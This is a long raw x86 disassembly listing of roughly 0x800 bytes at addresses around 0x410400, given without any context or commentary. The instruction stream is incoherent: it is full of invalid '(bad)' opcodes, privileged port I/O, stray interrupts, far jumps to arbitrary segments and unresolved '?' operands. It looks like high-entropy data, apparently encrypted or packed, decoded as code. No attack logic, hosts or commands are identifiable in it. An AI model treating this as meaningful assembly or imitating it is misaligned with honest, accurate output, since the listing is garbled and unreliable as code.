  4103cb:	mov    dl,ch
  4103cd:	mov    ebx,0xfafb1ef7
  4103d2:	jb     0x410360
  4103d4:	mov    edx,0x609c23d0
  4103d9:	xchg   esp,eax
  4103da:	ror    DWORD PTR [ebx-0x6d],cl
  4103dd:	int3   
  4103de:	pop    esi
  4103df:	inc    ebx
  4103e0:	cs pop ss
  4103e2:	out    0xd6,al
  4103e4:	add    ch,0x5b
  4103e7:	push   eax
  4103e8:	(bad)  
  4103e9:	push   edx
  4103ea:	in     eax,0x53
  4103ec:	dec    esp
  4103ed:	xor    edx,edx
  4103ef:	sbb    bl,ah
  4103f1:	jns    0x41041e
  4103f3:	imul   ebp,ebx,0x6e
  4103f6:	fidiv  DWORD PTR [edx]
  4103f8:	add    ch,dh
  4103fa:	and    al,0xdf
  4103fc:	fld    st(0)
  4103fe:	jne    0x4103ef
  410400:	sub    edx,esp
  410402:	mov    edx,0x8167939c
  410407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410408:	sbb    al,0x42
  41040a:	ins    DWORD PTR es:[edi],dx
  41040b:	push   ecx
  41040c:	icebp  
  41040d:	mov    eax,0xf7cd164a
  410412:	sub    esp,edx
  410414:	popf   
  410415:	xor    edx,edx
  410417:	inc    ebx
  410418:	popa   
  410419:	add    esp,ecx
  41041b:	adc    DWORD PTR [ebx+0x1a],eax
  41041e:	rcl    BYTE PTR [ebx],0x41
  410421:	add    eax,0x6fa581f7
  410426:	fbstp  TBYTE PTR [ebp-0x11e75826]
  41042c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41042d:	jno    0x4103f4
  41042f:	lea    ecx,[ebp-0x3b]
  410432:	gs mov bl,0xdd
  410435:	loope  0x4103eb
  410437:	rcl    DWORD PTR [eax],0x33
  41043a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043b:	fild   QWORD PTR [eax]
  41043d:	mov    ch,0xed
  41043f:	jecxz  0x410497
  410441:	mov    dh,0x4d
  410443:	mov    ds:0x155eead8,eax
  410448:	mov    ebp,0x57451727
  41044d:	pop    esp
  41044e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41044f:	test   al,0xb3
  410451:	jl     0x4103e3
  410453:	int    0xf7
  410455:	mov    esi,0xc48ced20
  41045a:	retf   0x50c0
  41045d:	int3   
  41045e:	sbb    ecx,0xd6852531
  410464:	pop    ebp
  410465:	(bad)  
  410467:	cmp    ah,al
  410469:	jle    0x41045d
  41046b:	push   ds
  41046c:	fst    DWORD PTR [eax]
  41046e:	and    bl,bl
  410470:	scas   al,BYTE PTR es:[edi]
  410471:	xor    esp,ebp
  410473:	sub    BYTE PTR [ecx+0x789f128d],ah
  410479:	push   edx
  41047a:	or     DWORD PTR ds:0xb5a83bce,0x4036e675
  410484:	mov    ebp,0x79c672b4
  410489:	popf   
  41048a:	push   0x13
  41048c:	sbb    esp,ecx
  41048e:	pop    ecx
  41048f:	dec    edx
  410490:	pop    ebp
  410491:	or     BYTE PTR [ebx],ch
  410493:	sub    al,0xc9
  410495:	(bad)  
  410496:	rcl    BYTE PTR [ecx],cl
  410498:	(bad)  
  41049a:	mov    al,cl
  41049c:	sahf   
  41049d:	call   0x18df:0x3e67d7b8
  4104a4:	add    DWORD PTR [eax+0x598de352],ecx
  4104aa:	push   edi
  4104ab:	dec    eax
  4104ac:	daa    
  4104ad:	aaa    
  4104ae:	mov    ebx,0x73d6aca4
  4104b3:	(bad)  
  4104b4:	retf   
  4104b5:	mov    cl,0xd4
  4104b7:	add    cl,BYTE PTR [esi]
  4104b9:	loope  0x41047d
  4104bb:	ret    
  4104bc:	push   ebp
  4104bd:	mov    esp,DWORD PTR [ebx-0x49a6dc80]
  4104c3:	pushf  
  4104c4:	mov    WORD PTR [edi],ds
  4104c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104c7:	ret    
  4104c8:	(bad)  
  4104c9:	lods   al,BYTE PTR ds:[esi]
  4104ca:	adc    esp,DWORD PTR [esi]
  4104cc:	mov    eax,ds:0x1f711a5b
  4104d1:	repz jns 0x410463
  4104d4:	ss das 
  4104d6:	xchg   esi,eax
  4104d7:	mul    BYTE PTR [eax+0x56]
  4104da:	jl     0x41047b
  4104dc:	enter  0x12a4,0xa6
  4104e0:	nop
  4104e1:	cmp    al,0x35
  4104e3:	adc    edi,edx
  4104e5:	imul   ecx,DWORD PTR [esp+ebp*2+0x2113da0d],0xc0619660
  4104f0:	mov    dl,0xfd
  4104f2:	inc    eax
  4104f3:	out    0xbe,al
  4104f5:	inc    edx
  4104f6:	ret    
  4104f7:	cmp    al,0x94
  4104f9:	in     al,0xa8
  4104fb:	push   eax
  4104fc:	je     0x41054e
  4104fe:	sub    esi,DWORD PTR gs:[esi-0x3eadde5]
  410505:	add    eax,ecx
  410507:	jg     0x410532
  410509:	(bad)  
  41050a:	xor    DWORD PTR [edx],esp
  41050c:	or     DWORD PTR [esp+ebx*8-0x38f20695],eax
  410513:	pop    es
  410514:	pop    ds
  410515:	and    eax,0xb7c9fb62
  41051a:	jecxz  0x41058e
  41051c:	scas   eax,DWORD PTR es:[edi]
  41051d:	mov    WORD PTR [ebx+eax*2],?
  410520:	rcl    DWORD PTR [edx-0x535a7b81],1
  410526:	ja     0x410558
  410528:	xor    al,BYTE PTR [esi+0x5c]
  41052b:	xlat   BYTE PTR ds:[ebx]
  41052c:	lea    eax,[edx]
  41052e:	dec    ebx
  41052f:	mov    dl,BYTE PTR [ebx+eiz*4]
  410532:	leave  
  410533:	cmp    DWORD PTR [edx+0x323ca4b0],esp
  410539:	arpl   WORD PTR es:[ebx+0x5f727c7f],cx
  410540:	leave  
  410541:	js     0x410565
  410543:	pushf  
  410544:	mov    WORD PTR [edx],es
  410546:	out    0xad,eax
  410548:	loop   0x41058a
  41054a:	(bad)  
  41054b:	bnd jnp 0x410599
  41054e:	lods   eax,DWORD PTR ds:[esi]
  41054f:	call   0x878d9e2e
  410554:	gs pop edx
  410556:	jg     0x410545
  410558:	lods   eax,DWORD PTR ds:[esi]
  410559:	push   eax
  41055a:	popa   
  41055b:	jle    0x4105bd
  41055d:	sbb    eax,0x65810ef5
  410562:	loope  0x4105bb
  410564:	add    DWORD PTR ds:0xe6b7db55,esp
  41056a:	push   cs
  41056b:	sbb    esi,DWORD PTR [edi+0x33]
  41056e:	ja     0x41056b
  410570:	add    al,0xfc
  410572:	aaa    
  410573:	outs   dx,BYTE PTR ds:[esi]
  410574:	mov    esp,0x4d69a70a
  410579:	shr    dh,0x27
  41057c:	ffree  st(6)
  41057e:	loopne 0x4105f7
  410580:	xchg   esi,eax
  410581:	mov    BYTE PTR [eax],cl
  410583:	ret    
  410584:	jns    0x41051c
  410586:	push   edx
  410587:	sub    BYTE PTR [edx+0x25],ah
  41058a:	lods   eax,DWORD PTR ds:[esi]
  41058b:	shl    BYTE PTR [edi+0xd],1
  41058e:	and    eax,0x5d815c49
  410593:	push   ds
  410594:	stos   DWORD PTR es:[edi],eax
  410595:	fbstp  TBYTE PTR [ebx+0x7b7c6623]
  41059b:	loop   0x4105bb
  41059d:	push   0x16c37772
  4105a2:	mov    ecx,0xcbbe310b
  4105a7:	popf   
  4105a8:	outs   dx,BYTE PTR ds:[esi]
  4105a9:	inc    edi
  4105aa:	sub    DWORD PTR [edx-0x2a],0xa60fff1b
  4105b1:	icebp  
  4105b2:	fidivr WORD PTR [ebp-0x74]
  4105b5:	sbb    edi,DWORD PTR [ecx]
  4105b7:	push   edx
  4105b8:	jbe    0x41062e
  4105ba:	or     ebx,esp
  4105bc:	inc    esi
  4105bd:	mov    BYTE PTR [edx+0x73187e93],al
  4105c3:	cld    
  4105c4:	aad    0x9e
  4105c6:	pop    ecx
  4105c7:	retf   0x1fd6
  4105ca:	hlt    
  4105cb:	jmp    0xa394:0x8774cc6a
  4105d2:	out    dx,eax
  4105d3:	adc    dl,BYTE PTR ds:0x91e1b1f2
  4105d9:	mov    bh,0xc2
  4105db:	in     al,dx
  4105dc:	test   eax,0x5b688a21
  4105e1:	cmp    DWORD PTR [ebx+0x1bf977ba],ecx
  4105e7:	sbb    esi,DWORD PTR [edx+0x54]
  4105ea:	jmp    0xa228:0xcb02db72
  4105f1:	sub    al,0xfb
  4105f3:	cmp    edx,eax
  4105f5:	adc    cl,BYTE PTR [esi]
  4105f7:	pop    edx
  4105f8:	cdq    
  4105f9:	dec    edx
  4105fa:	push   ebx
  4105fb:	pop    es
  4105fc:	cmp    eax,0x8dae32e6
  410601:	ficomp WORD PTR [edi-0x2c]
  410604:	js     0x4105c9
  410606:	mov    ds:0xba19d379,eax
  41060b:	push   es
  41060c:	stc    
  41060d:	out    0xee,al
  41060f:	push   0x36cc93a0
  410614:	ss fsub st(4),st
  410617:	fistp  WORD PTR [ecx]
  410619:	jmp    0x96ff8879
  41061e:	inc    edi
  41061f:	out    dx,al
  410620:	mov    ch,0xca
  410622:	jg     0x4105c1
  410624:	push   esi
  410625:	mov    ecx,0xed0079cd
  41062a:	mov    ecx,0x98604b13
  41062f:	js     0x410671
  410631:	mov    esi,0x275e73ce
  410636:	out    dx,al
  410637:	cld    
  410638:	push   es
  410639:	jl     0x410696
  41063b:	xchg   esi,eax
  41063c:	or     dh,BYTE PTR [edx-0x5bd0a8c5]
  410642:	dec    edi
  410643:	or     eax,edx
  410645:	imul   BYTE PTR [eax-0x14]
  410648:	imul   ecx,eax,0xffffffd6
  41064b:	push   es
  41064c:	add    DWORD PTR [esp+edi*1],edx
  41064f:	cld    
  410650:	test   al,0x96
  410652:	rcr    DWORD PTR [esp+ebp*2],1
  410655:	or     DWORD PTR [edx+0x33],ebx
  410658:	repnz outs dx,BYTE PTR ds:[esi]
  41065a:	sbb    al,0x36
  41065c:	sub    DWORD PTR [eax],edx
  41065e:	ins    DWORD PTR es:[edi],dx
  41065f:	and    al,0x56
  410661:	dec    edi
  410662:	retf   
  410663:	mov    al,0x14
  410665:	jbe    0x410685
  410667:	xchg   ebp,eax
  410668:	lods   eax,DWORD PTR ds:[esi]
  410669:	and    ebp,DWORD PTR [edi]
  41066b:	in     al,0x62
  41066d:	mov    ds:0xc3c0d724,al
  410672:	mov    ds:0x4d08da69,al
  410677:	fbstp  TBYTE PTR [ebp+0x57c1777c]
  41067d:	inc    edx
  41067e:	cli    
  41067f:	repz pop eax
  410681:	or     DWORD PTR [ebx+edx*2],ebp
  410684:	fdivr  DWORD PTR [ebp-0x18cc2614]
  41068a:	inc    ecx
  41068b:	xchg   DWORD PTR [esi+0x627d1dd7],eax
  410691:	jg     0x410621
  410693:	sub    DWORD PTR [ebx],ebp
  410695:	and    ch,BYTE PTR [ecx+edi*8+0x28]
  410699:	and    ebp,edi
  41069b:	push   esp
  41069c:	jne    0x4106f5
  41069e:	out    0x70,al
  4106a0:	cwde   
  4106a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106a2:	mov    esp,0x90ed8648
  4106a7:	clc    
  4106a8:	jnp    0x41070b
  4106aa:	push   cs
  4106ab:	out    0x71,al
  4106ad:	and    ebx,ebx
  4106af:	jmp    0xbf91713f
  4106b4:	jge    0x410706
  4106b6:	mov    dh,ah
  4106b8:	xor    al,0xf3
  4106ba:	cmp    bl,BYTE PTR [esp+eax*1]
  4106bd:	(bad)  
  4106be:	sub    al,0x2c
  4106c0:	pop    edi
  4106c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c2:	fisttp DWORD PTR [eax+0x5f]
  4106c5:	dec    esp
  4106c6:	mov    ds:0x9e13ac93,al
  4106cb:	xor    esp,DWORD PTR [edi+ecx*2]
  4106ce:	loopne 0x4106eb
  4106d0:	dec    esi
  4106d1:	cld    
  4106d2:	mov    edx,0x652e249b
  4106d7:	imul   esp,DWORD PTR [edi-0x59bfc73d],0xb7bee5c0
  4106e1:	les    esp,FWORD PTR [eax-0x6913897a]
  4106e7:	jbe    0x4106f8
  4106e9:	outs   dx,DWORD PTR ds:[esi]
  4106ea:	popa   
  4106eb:	jbe    0x4106be
  4106ed:	and    eax,esi
  4106ef:	mov    esi,0xbb504ba4
  4106f4:	test   dl,dh
  4106f6:	test   eax,0x3478be3e
  4106fb:	mov    BYTE PTR [ecx],dh
  4106fd:	pop    ss
  4106fe:	sti    
  4106ff:	mov    ecx,0xe49448c2
  410704:	push   0x8
  410706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410707:	mov    ebx,0xf26e410a
  41070c:	cs pop esp
  41070e:	inc    ebp
  41070f:	add    al,0xa3
  410711:	retf   
  410712:	aad    0x99
  410714:	pop    ebx
  410715:	mov    cl,0x4f
  410717:	(bad)  
  410718:	cmc    
  410719:	jmp    0x7e499ec7
  41071e:	dec    edx
  41071f:	in     eax,dx
  410720:	and    ch,dl
  410722:	rcl    BYTE PTR [ebx],cl
  410724:	lahf   
  410725:	push   es
  410726:	dec    ecx
  410727:	aas    
  410728:	mov    esp,0x739b9cd2
  41072d:	add    ecx,DWORD PTR [ebx-0x14]
  410730:	in     eax,0xdd
  410732:	leave  
  410733:	jbe    0x4106cb
  410735:	in     al,0x31
  410737:	imul   esi,DWORD PTR [ecx-0x6f],0x70
  41073b:	clc    
  41073c:	or     edi,ebp
  41073e:	xchg   esi,eax
  41073f:	les    ebp,FWORD PTR [ecx-0x14edb990]
  410745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410747:	jbe    0x410745
  410749:	clc    
  41074a:	mov    WORD PTR [ecx-0x37ca12c9],cs
  410750:	dec    esp
  410751:	xchg   esp,eax
  410752:	mov    al,0x8d
  410754:	data16 xor bh,bl
  410757:	out    0x18,eax
  410759:	add    bl,dh
  41075b:	and    eax,0xdcaae265
  410760:	rcl    bl,1
  410762:	mov    cl,0xf9
  410764:	pop    ss
  410765:	int    0x37
  410767:	fwait
  410768:	loop   0x41071e
  41076a:	push   edi
  41076b:	sub    bl,dh
  41076d:	lods   al,BYTE PTR ds:[esi]
  41076e:	data16 arpl WORD PTR ds:[ebx],sp
  410772:	jg     0x4107df
  410774:	ss cmovno ebx,DWORD PTR ds:[esp+ebx*2+0x1edbddb1]
  41077e:	inc    edx
  41077f:	and    bh,BYTE PTR [ebx+0xc]
  410782:	jbe    0x41072e
  410784:	sub    BYTE PTR [ebp+0x7c],0xb5
  410788:	jmp    0x674a724c
  41078d:	mov    dh,ch
  41078f:	jmp    0xba554aae
  410794:	je     0x4107e3
  410796:	inc    edx
  410797:	fcomp  DWORD PTR [ecx]
  410799:	test   eax,0x895eaf5b
  41079e:	ins    BYTE PTR es:[edi],dx
  41079f:	xor    eax,0x5f685ba1
  4107a4:	scas   al,BYTE PTR es:[edi]
  4107a5:	mov    bh,0x89
  4107a7:	and    BYTE PTR [ebp+0x3a06be54],dh
  4107ad:	jmp    0xd65f:0xdd91e937
  4107b4:	repnz and ecx,DWORD PTR [edi-0x1be9d8e2]
  4107bb:	pop    eax
  4107bc:	jns    0x4107e1
  4107be:	mov    cl,0xdd
  4107c0:	outs   dx,DWORD PTR ds:[esi]
  4107c1:	(bad)  
  4107c2:	adc    al,0xd2
  4107c4:	jo     0x41075e
  4107c6:	addr16 jmp 0x52f1:0x36c635a1
  4107ce:	mov    eax,0xb216969c
  4107d3:	test   cl,ah
  4107d5:	xor    ch,BYTE PTR [ebp+0x2dc78387]
  4107db:	xchg   ebx,eax
  4107dc:	adc    al,0xe
  4107de:	aam    0x90
  4107e0:	and    eax,0x753d372b
  4107e5:	inc    edi
  4107e6:	pop    ds
  4107e7:	adc    eax,0x33025081
  4107ec:	push   cs
  4107ed:	jo     0x4107c8
  4107ef:	and    eax,0x26af5eea
  4107f4:	push   cs
  4107f5:	int    0xca
  4107f7:	ins    DWORD PTR es:[edi],dx
  4107f8:	popa   
  4107f9:	inc    edi
  4107fa:	test   al,0xd4
  4107fc:	mov    edx,0x96b275b8
  410801:	mov    ah,al
  410803:	push   0xffffff90
  410805:	mov    dl,0x2c
  410807:	mov    ebx,0x2d86f08b
  41080c:	cwde   
  41080d:	xor    BYTE PTR [edx-0x2cfa5cd5],ch
  410813:	scas   al,BYTE PTR es:[edi]
  410814:	cmp    eax,0x46eeb46a
  410819:	xor    eax,0x14c35bac
  41081e:	xchg   esp,eax
  41081f:	out    dx,al
  410820:	and    eax,0x6a3ec6e9
  410825:	lock push eax
  410827:	sub    al,0x9f
  410829:	cmp    ebx,DWORD PTR [ecx-0x1a]
  41082c:	lahf   
  41082d:	pop    ebx
  41082e:	fsub   DWORD PTR [esi-0x7d]
  410831:	push   eax
  410832:	or     ebx,DWORD PTR [ecx]
  410834:	or     ebx,DWORD PTR [ebp+ebp*2+0x47e1f04c]
  41083b:	xchg   BYTE PTR [edx],ch
  41083d:	fld    TBYTE PTR [esi]
  41083f:	add    eax,0x2a38009f
  410844:	mov    ds:0xb21f4797,eax
  410849:	xor    dl,BYTE PTR [esi-0x4c]
  41084c:	pop    ss
  41084d:	lods   al,BYTE PTR ds:[esi]
  41084e:	and    BYTE PTR [eax],bh
  410850:	shl    DWORD PTR [edi],1
  410852:	rcl    esi,1
  410854:	push   edi
  410855:	scas   al,BYTE PTR es:[edi]
  410856:	ficom  WORD PTR [eax]
  410858:	push   ebp
  410859:	jns    0x410802
  41085b:	ror    DWORD PTR [esi+0x67260d64],1
  410861:	arpl   WORD PTR ds:0x7e4664cf,ax
  410867:	test   DWORD PTR [eax],eax
  410869:	xor    bl,0x87
  41086c:	leave  
  41086d:	push   cs
  41086e:	push   0x19
  410870:	pop    esi
  410871:	xor    BYTE PTR cs:[ecx],ah
  410874:	push   esp
  410875:	ins    BYTE PTR es:[edi],dx
  410876:	mov    cl,0x12
  410878:	(bad)  
  410879:	(bad)
  41087c:	(bad)  
  41087d:	mov    ds:0xf635f8ba,eax
  410882:	xchg   ebx,eax
  410883:	adc    dl,ch
  410885:	adc    edx,ebp
  410887:	xchg   esi,eax
  410888:	test   DWORD PTR [ebx],ebp
  41088a:	push   eax
  41088b:	pop    ss
  41088c:	mov    edi,0x6779fa63
  410891:	rcr    DWORD PTR gs:[ebp+0x391be99e],1
  410898:	adc    DWORD PTR [eax+eiz*8],ebx
  41089b:	fwait
  41089c:	xchg   esi,eax
  41089d:	xor    eax,0xd7176528
  4108a2:	xchg   BYTE PTR [esi+ebx*1-0x51844a1a],cl
  4108a9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4108ab:	mul    BYTE PTR [ecx+0x7f6d6a28]
  4108b1:	jecxz  0x410869
  4108b3:	xor    DWORD PTR ds:0x80041e22,eax
  4108b9:	or     BYTE PTR [ebx],dl
  4108bb:	cdq    
  4108bc:	sub    DWORD PTR [esi+0x59],0xffffffb6
  4108c0:	xchg   ebp,eax
  4108c1:	or     eax,0x4f381e96
  4108c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c7:	mov    ch,0xae
  4108c9:	sub    BYTE PTR [eax+ecx*4],ch
  4108cc:	mov    al,0x9b
  4108ce:	test   al,0x4b
  4108d0:	adc    bh,BYTE PTR [ecx]
  4108d2:	inc    eax
  4108d3:	inc    edi
  4108d4:	dec    edi
  4108d5:	sub    eax,0x3d08f6d3
  4108da:	fisub  DWORD PTR [ebp+edx*4+0x62]
  4108de:	pop    esp
  4108df:	sbb    BYTE PTR [esi*4-0x39e0604b],al
  4108e6:	inc    ebx
  4108e7:	sbb    al,0x86
  4108e9:	mov    cl,0x49
  4108eb:	fst    QWORD PTR [edi+0x794e8783]
  4108f1:	sti    
  4108f2:	add    edi,DWORD PTR [ebx+eax*2-0x26]
  4108f6:	sub    BYTE PTR [ecx+0x24077922],ah
  4108fc:	aaa    
  4108fd:	fistp  QWORD PTR [edx+0x2dffb601]
  410903:	jbe    0x4108b0
  410905:	inc    ecx
  410906:	setns  BYTE PTR [ecx-0x5a]
  41090a:	jmp    0xe1e6:0xde6b3a2
  410911:	imul   esi,ecx,0xca41e01d
  410917:	popf   
  410918:	imul   edi,DWORD PTR [ecx],0x3f
  41091b:	adc    DWORD PTR [esi],ebp
  41091d:	(bad)  
  41091e:	jmp    0xa55c:0x14e19821
  410925:	daa    
  410926:	mov    dh,0xa4
  410928:	fs xchg ecx,eax
  41092a:	ins    DWORD PTR es:[edi],dx
  41092b:	push   0x159d1dc1
  410930:	sbb    al,0xd9
  410932:	aas    
  410933:	in     al,dx
  410934:	lahf   
  410935:	mov    WORD PTR [eax+ebp*4],ss
  410938:	fldenv [edi]
  41093a:	inc    esp
  41093b:	outs   dx,DWORD PTR ds:[esi]
  41093c:	fwait
  41093d:	add    DWORD PTR [ebp+0x47],eax
  410940:	gs cmp al,0x5f
  410943:	sbb    eax,0x9c88f704
  410948:	inc    ebx
  410949:	test   DWORD PTR [ecx],edi
  41094b:	pushf  
  41094c:	das    
  41094d:	inc    ebx
  41094e:	jp     0x4108f0
  410950:	rcl    BYTE PTR [edx+0x7d],1
  410953:	mov    ecx,0xebd7a9a8
  410958:	dec    eax
  410959:	mov    al,ds:0xe01cab44
  41095e:	sbb    dh,BYTE PTR [ebx+eax*2+0x4fd38d34]
  410965:	test   DWORD PTR [ebp-0x8],ecx
  410968:	xchg   ebx,eax
  410969:	js     0x410975
  41096b:	or     DWORD PTR [ebp+0x1f],edi
  41096e:	mov    dl,0xa5
  410970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410971:	mov    eax,ds:0x47271302
  410976:	sub    al,0x18
  410978:	repnz lea ecx,[edx+esi*1+0x56ae6fe8]
  410980:	xor    eax,0x6b596d1c
  410985:	pop    eax
  410986:	mov    dh,0xe9
  410988:	test   eax,0x30856409
  41098e:	mov    al,ds:0x1b4f0e5b
  410993:	cmp    DWORD PTR [ebx],ebx
  410995:	aas    
  410996:	inc    ecx
  410997:	in     eax,0x11
  410999:	dec    edx
  41099a:	xchg   BYTE PTR [eax-0x17c3fde6],bl
  4109a0:	rol    BYTE PTR [esi+0x3b],1
  4109a3:	dec    DWORD PTR [esi+0x38f5861f]
  4109a9:	xchg   ebx,eax
  4109aa:	pop    es
  4109ab:	and    al,0xf2
  4109ad:	push   ss
  4109ae:	dec    ecx
  4109af:	push   cs
  4109b0:	(bad)  
  4109b1:	in     eax,0x3f
  4109b3:	jp     0x4109df
  4109b5:	adc    eax,0xffa04a7a
  4109ba:	jae    0x410a1f
  4109bc:	sbb    al,al
  4109be:	cmp    DWORD PTR [ebx+0x4f],ebp
  4109c1:	icebp  
  4109c2:	jge    0x4109f6
  4109c4:	jl     0x4109d4
  4109c6:	fmul   DWORD PTR [edi-0x64]
  4109c9:	jb     0x41098b
  4109cb:	mov    edi,0x3eabef79
  4109d0:	bound  esp,QWORD PTR [ecx-0x12]
  4109d3:	and    BYTE PTR [esi-0x6a74c623],ch
  4109d9:	addr16 jae 0x4109b5
  4109dc:	cmc    
  4109dd:	fcom   QWORD PTR [ebx+edi*1]
  4109e0:	push   ds
  4109e1:	outs   dx,BYTE PTR ds:[esi]
  4109e2:	sbb    BYTE PTR [ebx+0x3d10993b],dl
  4109e8:	cmp    eax,0x6152121
  4109ed:	imul   ecx,DWORD PTR [edx],0xea15b651
  4109f3:	sbb    BYTE PTR [esi+0x75],bl
  4109f6:	sub    BYTE PTR [edx],al
  4109f8:	int    0x77
  4109fa:	fmul   QWORD PTR [esi]
  4109fc:	xor    al,0xa5
  4109fe:	mov    eax,0x2fb9d5a1
  410a03:	arpl   WORD PTR [si+0x7a],si
  410a07:	push   edi
  410a08:	dec    eax
  410a09:	scas   eax,DWORD PTR es:[edi]
  410a0a:	mov    bh,0xa
  410a0c:	add    ebp,DWORD PTR [eax+0x49]
  410a0f:	push   ebp
  410a10:	mov    edi,tr2
  410a13:	(bad)  
  410a14:	jmp    0x410a73
  410a16:	add    ah,BYTE PTR [esi]
  410a18:	sub    BYTE PTR [esi-0x149c3e8a],ah
  410a1e:	push   edi
  410a1f:	test   DWORD PTR [ecx-0x568141c2],edi
  410a25:	mov    bh,0x67
  410a27:	push   ss
  410a28:	fsubrp st(5),st
  410a2a:	adc    al,0xd
  410a2c:	aaa    
  410a2d:	out    dx,eax
  410a2e:	sub    eax,0x2ac7ce6a
  410a33:	out    dx,al
  410a34:	cli    
  410a35:	sti    
  410a36:	setl   BYTE PTR [ebx-0x37]
  410a3a:	cdq    
  410a3b:	push   edi
  410a3c:	or     BYTE PTR [ebp-0x209d14bc],cl
  410a42:	in     eax,0x8e
  410a44:	adc    dl,BYTE PTR [eax-0x2e]
  410a47:	hlt    
  410a48:	lds    ecx,FWORD PTR [edi+0xe]
  410a4b:	test   BYTE PTR [edx-0x3e4075e6],dl
  410a51:	cmp    ecx,DWORD PTR [ebx-0x5028be9a]
  410a57:	xchg   edi,eax
  410a58:	and    al,0x88
  410a5a:	fcomp  QWORD PTR [ebx]
  410a5c:	int    0xc0
  410a5e:	cmc    
  410a5f:	adc    DWORD PTR [ebx+eiz*8-0x4],esi
  410a63:	sub    dh,BYTE PTR [esi+0x51]
  410a66:	in     al,0xb0
  410a68:	arpl   bp,sp
  410a6a:	dec    ecx
  410a6b:	imul   ecx,esi,0xffffff8a
  410a6e:	shr    BYTE PTR [ecx+0x258dbbd5],cl
  410a74:	fild   WORD PTR [ebp-0x3a]
  410a77:	call   0x4c787377
  410a7c:	div    BYTE PTR [esp+edx*1+0x5e9a13bd]
  410a83:	push   ss
  410a84:	mov    esp,DWORD PTR [edx+0x2e]
  410a87:	lods   eax,DWORD PTR ds:[esi]
  410a88:	test   al,0xda
  410a8a:	arpl   WORD PTR [edx],sp
  410a8c:	clc    
  410a8d:	adc    al,0xba
  410a8f:	or     ebx,edi
  410a91:	test   DWORD PTR [edx+0x2d],0xf74ef543
  410a98:	psubsw mm4,mm0
  410a9b:	push   eax
  410a9c:	gs mov edx,0x8cf48d8c
  410aa2:	xor    al,0x3c
  410aa4:	add    BYTE PTR [eax+0x22],bh
  410aa7:	retf   0x4783
  410aaa:	xor    eax,0x88f82c91
  410aaf:	and    eax,0x2cc414cc
  410ab4:	mov    ds:0x884f4ace,eax
  410ab9:	int    0x2c
  410abb:	loop   0x410ad5
  410abd:	out    dx,al
  410abe:	jno    0x410a58
  410ac0:	adc    ebp,DWORD PTR [ebx+ebx*1-0x64194afd]
  410ac7:	or     ebp,DWORD PTR [eax+edi*2-0x26]
  410acb:	iret   
  410acc:	loope  0x410abd
  410ace:	sub    al,0xe8
  410ad0:	call   0x287a:0xd6f951cb
  410ad7:	inc    edi
  410ad8:	(bad)  
  410ada:	enter  0xacb4,0xeb
  410ade:	pop    ecx
  410adf:	rcl    DWORD PTR [ecx-0x64],cl
  410ae2:	xchg   edi,eax
  410ae3:	xor    edx,DWORD PTR [edi-0x73]
  410ae6:	rol    BYTE PTR [ebp-0x79],cl
  410ae9:	or     al,0x9
  410aeb:	mov    eax,0xef1bcafb
  410af0:	mov    ecx,0x1d287177
  410af5:	pop    esp
  410af6:	inc    edi
  410af7:	dec    edi
  410af8:	shl    BYTE PTR [ebx],cl
  410afa:	cs popf 
  410afc:	cs mov bh,cl
  410aff:	jne    0x410b5b
  410b01:	dec    esp
  410b02:	ja     0x410af2
  410b04:	shl    DWORD PTR [esi+0x3c],cl
  410b07:	(bad)  
  410b08:	call   0x618b8957
  410b0d:	pop    edx
  410b0e:	push   ebx
  410b0f:	mov    cl,0xdd
  410b11:	mov    ah,0x78
  410b13:	imul   ecx,DWORD PTR [esi-0x45c4910e],0x3a
  410b1a:	out    dx,al
  410b1b:	clc    
  410b1c:	test   BYTE PTR [eax+eax*8+0x4005068a],ch
  410b23:	pop    edx
  410b24:	push   esi
  410b25:	add    ebp,DWORD PTR [esi+ebx*1]
  410b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b29:	div    bh
  410b2b:	imul   ecx,DWORD PTR [si+0x5f],0x98c59fcd
  410b33:	sar    BYTE PTR [edi+0x55],cl
  410b36:	out    0x3d,eax
  410b38:	sti    
  410b39:	popf   
  410b3a:	call   0x4420:0xb0347677
  410b41:	mov    cl,0x8f
  410b43:	or     DWORD PTR [ebx],esp
  410b45:	pop    ecx
  410b46:	mov    bl,0x89
  410b48:	arpl   WORD PTR [ebx+0x7d],dx
  410b4b:	nop
  410b4c:	xchg   bl,bh
  410b4e:	inc    ebp
  410b4f:	cmp    al,0xcc
  410b51:	cwde   
  410b52:	jnp    0x410b47
  410b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b55:	xor    ebx,edx
  410b57:	pop    edx
  410b58:	adc    eax,0x871838b7
  410b5d:	stos   DWORD PTR es:[edi],eax
  410b5e:	dec    esp
  410b5f:	and    edx,DWORD PTR [edi-0x6f]
  410b62:	add    bh,BYTE PTR [esi+0x12]
  410b65:	cmp    edi,DWORD PTR [ebp-0x430a27b6]
  410b6b:	jmp    0x6dbd:0xe204d997
  410b72:	mov    ?,WORD PTR [ecx-0x1b]
  410b75:	mov    ecx,0xd36a80a
  410b7a:	push   ebx
  410b7b:	jge    0x410b5a
  410b7d:	xor    al,0x91
  410b7f:	jecxz  0x410b33
  410b81:	jge    0x410b52
  410b83:	cmc    
  410b84:	adc    esp,esi
  410b86:	or     al,0x43
  410b88:	push   ds
  410b89:	add    BYTE PTR [edx+0x6c5ba705],bl
  410b8f:	cmp    DWORD PTR [ecx],0xffffffd2
  410b92:	dec    ebx
  410b93:	js     0x410b3d
  410b95:	mov    BYTE PTR [edx],cl
  410b97:	mov    DWORD PTR [esp+ebx*4-0x6],esi
  410b9b:	adc    al,0x2
  410b9d:	add    DWORD PTR [esi-0x1a607a1b],ebp
  410ba3:	ja     0x410be6
  410ba5:	adc    al,0xcf
  410ba7:	mov    WORD PTR [ecx+0x79],?
